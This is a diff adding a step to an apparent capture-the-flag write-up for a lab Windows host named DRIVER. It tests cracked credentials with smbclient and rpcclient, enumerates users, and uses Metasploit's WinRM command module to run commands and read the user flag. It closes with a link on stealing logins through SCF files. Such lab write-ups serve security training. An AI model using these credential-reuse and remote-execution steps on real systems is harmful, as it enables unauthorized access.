@@ -113,6 +113,127 @@ Started: Wed Jan 12 20:39:44 2022
 Stopped: Wed Jan 12 20:40:42 2022
 ````
 
+6. Test the credentials
+````
+# smbclient -L //DRIVER -U tony -m SMB2
+Enter WORKGROUP\tony's password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+SMB1 disabled -- no workgroup available
+````
+
+````
+# rpcclient -U tony DRIVER                
+Enter WORKGROUP\tony's password: 
+rpcclient $> srvinfo
+        DRIVER         Wk Sv NT             
+        platform_id     :       500
+        os version      :       10.0
+        server type     :       0x1003
+rpcclient $> enumdomusers 
+user:[Administrator] rid:[0x1f4]
+user:[DefaultAccount] rid:[0x1f7]
+user:[Guest] rid:[0x1f5]
+user:[tony] rid:[0x3eb]
+````
+
+````
+msf6 auxiliary(scanner/winrm/winrm_cmd) > show options
+
+Module options (auxiliary/scanner/winrm/winrm_cmd):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   CMD       ipconfig /all    yes       The windows command to run
+   DOMAIN    WORKSTATION      yes       The domain to use for Windows authentification
+   PASSWORD  liltony          yes       The password to authenticate with
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS    DRIVER           yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT     5985             yes       The target port (TCP)
+   SSL       false            no        Negotiate SSL/TLS for outgoing connections
+   THREADS   1                yes       The number of concurrent threads (max one per host)
+   URI       /wsman           yes       The URI of the WinRM service
+   USERNAME  tony             yes       The username to authenticate as
+   VHOST                      no        HTTP server virtual host
+
+msf6 auxiliary(scanner/winrm/winrm_cmd) > run
+
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : DRIVER
+   Primary Dns Suffix  . . . . . . . :
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : htb
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : htb
+   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
+   Physical Address. . . . . . . . . : 00-50-56-B9-27-9E
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   IPv6 Address. . . . . . . . . . . : dead:beef::18f(Preferred)
+   Lease Obtained. . . . . . . . . . : Thursday, January 13, 2022 12:25:07 AM
+   Lease Expires . . . . . . . . . . : Thursday, January 13, 2022 1:15:07 AM
+   Link-local IPv6 Address . . . . . : fe80::4c36:4532:7be5:7ecd%5(Preferred)
+   IPv4 Address. . . . . . . . . . . : 10.10.11.106(Preferred)
+   Subnet Mask . . . . . . . . . . . : 255.255.254.0
+   Default Gateway . . . . . . . . . : 10.10.10.2
+   DHCPv6 IAID . . . . . . . . . . . : 50352214
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-29-71-9A-3A-00-50-56-B9-27-9E
+   DNS Servers . . . . . . . . . . . : 1.1.1.1
+                                       8.8.8.8
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+   Connection-specific DNS Suffix Search List :
+                                       htb
+
+Tunnel adapter isatap.{99C52957-7ED3-4943-91B6-CD52EF4D6AFC}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : htb
+   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
+   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+[+] Results saved to /root/.msf4/loot/20220112210701_default_10.10.11.106_winrm.cmd_result_387450.txt
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+````
+
+````
+msf6 auxiliary(scanner/winrm/winrm_cmd) > set CMD dir C:\\Users\\tony\\Desktop\\
+CMD => dir C:\Users\tony\Desktop\
+msf6 auxiliary(scanner/winrm/winrm_cmd) > run
+
+
+
+    Directory: C:\Users\tony\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        1/13/2022  12:25 AM             34 user.txt
+
+
+[+] Results saved to /root/.msf4/loot/20220112210931_default_10.10.11.106_winrm.cmd_result_636504.txt
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/winrm/winrm_cmd) > set CMD type C:\\Users\\tony\\Desktop\\user.txt
+CMD => type C:\Users\tony\Desktop\user.txt
+msf6 auxiliary(scanner/winrm/winrm_cmd) > run
+
+0670f60401f62dd13fe3b7c5597ac4a0
+[+] Results saved to /root/.msf4/loot/20220112210951_default_10.10.11.106_winrm.cmd_result_585824.txt
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+````
 
 
 [Shell Command File](https://www.bleepingcomputer.com/news/security/you-can-steal-windows-login-credentials-via-google-chrome-and-scf-files/)
